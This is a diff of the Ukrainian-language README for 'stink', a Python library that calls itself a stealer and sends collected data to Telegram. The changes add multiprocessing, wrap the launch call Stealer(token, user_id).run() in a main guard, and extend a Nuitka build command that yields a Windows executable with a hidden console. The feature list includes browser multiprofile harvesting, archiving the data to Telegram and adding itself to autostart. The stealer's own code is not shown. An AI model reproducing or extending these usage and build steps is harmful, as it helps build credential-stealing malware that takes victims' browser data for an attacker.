@@ -7,7 +7,7 @@
 
 # stink
 
-Стилер всього лише у 2 рядки з відправкою до Telegram.
+Стилер всього лише у 3 рядки з відправкою до Telegram.
 
 ## Опис
 `stink` вже має значний функціонал, який тільки розширюватиметься.
@@ -49,14 +49,16 @@
 3. Підтримка мультипрофілів браузера.
 4. Відправка зібраних даних архівом в Telegram.
 5. Виконання в окремому потоці.
-6. Можливість додання в автозапуск.
+6. Виконання з використанням багатопроцесорності.
+7. Можливість додання в автозапуск.
 
 ## Приклад використання
 ### Стандартний
 ```python
 from stink import Stealer
 
-Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+if __name__ == '__main__':
+    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 ### Додаткові параметри
 
@@ -141,7 +143,8 @@ Python являється інтерпретованою мовою програ
 ```python
 from stink import Stealer
 
-Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+if __name__ == '__main__':
+    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
 ### За допомогою BAT
@@ -178,7 +181,7 @@ pip install zstandard==0.17.0
 ```
 8. Прописуємо команду:
 ```
-nuitka --onefile --windows-disable-console test.py
+nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
 ```
 
 Після виконання команди отримуємо test.exe файл із прихованою консоллю.
